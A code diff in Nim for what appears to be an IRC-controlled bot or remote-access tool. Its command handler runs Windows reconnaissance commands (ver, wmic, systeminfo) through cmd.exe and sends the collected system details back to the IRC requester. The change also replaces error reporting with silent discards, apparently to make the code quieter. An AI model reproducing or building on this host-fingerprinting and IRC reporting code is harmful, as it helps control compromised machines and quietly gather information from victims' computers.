@@ -458,33 +458,35 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
             win_mod = "<void>"
         
         try:
-            var (output, _ ) = execCmdEx("ver" ,options = {poUsePath})
+            var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
             win_ver = output
         except OSError as e:
-            win_ver = repr(e)
+            #win_ver = repr(e)
+            discard
 
         try:
-            var (output, _ ) = execCmdEx("wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
+            var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
             win_csd = output
         except OSError as e:
-            win_csd = repr(e)
-        
+            #win_csd = repr(e)
+            discard
+
         try:
-            var (output, _ ) = execCmdEx("systeminfo" ,options = {poUsePath})
+            var (output, _ ) = execCmdEx("cmd.exe /c systeminfo" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
             win_sys = output
         except OSError as e:
-            win_sys = repr(e)
-        
+            #win_sys = repr(e)
+            discard
         try:
-            var (output, _ ) = execCmdEx("wmic computersystem get Model /value" ,options = {poUsePath})
+            var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
             output = output.strip(chars={'\r','\n'})
             win_mod = output
         except OSError as e:
-            win_mod = repr(e)
-
+            #win_mod = repr(e)
+            discard
         
         discard client.privmsg(event.origin,
             "heyyy v" & 
